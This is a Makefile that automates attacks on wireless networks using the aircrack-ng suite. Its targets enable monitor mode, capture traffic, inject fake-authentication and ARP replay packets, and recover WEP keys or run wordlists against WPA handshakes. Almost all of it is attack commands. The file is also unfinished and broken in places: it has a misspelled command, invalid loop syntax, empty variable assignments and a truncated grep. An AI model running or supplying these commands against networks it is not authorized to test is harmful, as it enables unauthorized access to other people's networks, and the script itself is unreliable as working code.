SHELL := /bin/bash

#main wep
#needs testing
wep:
	echo "starting wep suite\n"
	echo "initializing terminal 1 vars\n"
	make wanScan
	echo "executing terminal 1 processes\n"
	echo "loading up other terminals\n"

	#opens a second terminal
	echo "Attempting to open terminal 2\n"
	xfce4-terminal -T 'env PROMPT_COMMAND="
	echo\ "terminal 2 open, initializing...\n";
	make\ wanScan;
	echo\ "terminal 2 initialized, waiting for network change...\n";
	sleep\ 10s;
	make\ ivGen;
	make\ arpRelay" bash'
	#third terminal
	echo "Attempting to open terminal 3\n"
	xfce4-terminal -T 'env PROMPT_COMMAND="
	echo\ "terminal 3 open, initializing...\n";
	make\ wanScan;
	echo\ "terminal 3 initialized, waiting for network change...\n";
	sleep\ 11s;
	echo\ "waiting for IVs to finish\n";
	sleep\ 30s;
	ehco\ "cracking\n";
	make\ crack;
	" bash'

	sleep 2s
	make stopNetworkMan
	make startTerm1
	echo "make wepCleanup when ready\n"


#wep stuff
wepInit:
	int="$(ifconfig | grep -Po 'wl.*?(?=\s)')"
	mac="$(ifconfig | grep -Po '(?=^wl.*?HW).*' | grep -Po '\d\d\:.*')"
ivGen:
	sudo aireplay-ng -1 0 -e $essid -a $bssid -h $mac mon0
arpRelay:
	do
	sudo aireplay-ng -3 -b $bssid -h $mac mon0
	done while(error)
crack:
	sudo aircrack-ng -b $bssid output*.cap
wepCleanup:
	sudo airmon-ng stop mon0
	sudo rm output*
	sudo rm replay*
	sudo NetworkManager


#main wpa 
#testable
#
wpa:
	echo "starting wpa suite\n"
	echo "initializing terminal 1 vars\n"
	make wanScan
	echo "executing terminal 1 processes\n"
	#opens a second terminal
	echo "Attempting to open terminal 2\n"
	xfce4-terminal -T 'env PROMPT_COMMAND="
	echo\ "terminal 2 open, initializing...\n";
	make\ wanScan;
	echo\ "terminal 2 initialized, waiting for network change...\n";
	sleep\ 60s;
	echo\ "cracking";
	make\ wpaCrack" bash'
	sleep 2s
	make stopNetworkMan
	make startTerm1
	echo "make wepCleanup when ready\n"
#wpa stuff
wpaCrack:
	sudo aircrack-ng -w words.txt -b $bssid output*.cap
	echo "stop here if it worked\n"
	sudo aircrack-ng -w morewords.txt -b $bssid output*.cap


#General Use

#this will output all available networks broacasting and set related vars
startTerm1:
	sudo airmon-ng start $int $chan
	sudo airodump-ng -c $chan --bssid $bssid -w output mon0
#maybe add something that parses like a regex to just pull and set the values automagically

#setting up vars on any and all terminals
wanScan:
	sudo iwlist $int scan | grep -E '(Address:|Channel:|ESSID:)' | grep #something
	essid=
	bssid=
	chan=

#halts the network manager and turns the $int device off
stopNetworkMan:
	sudo /etc/init.d/network-manager stop
	sudo ifconfig $int down
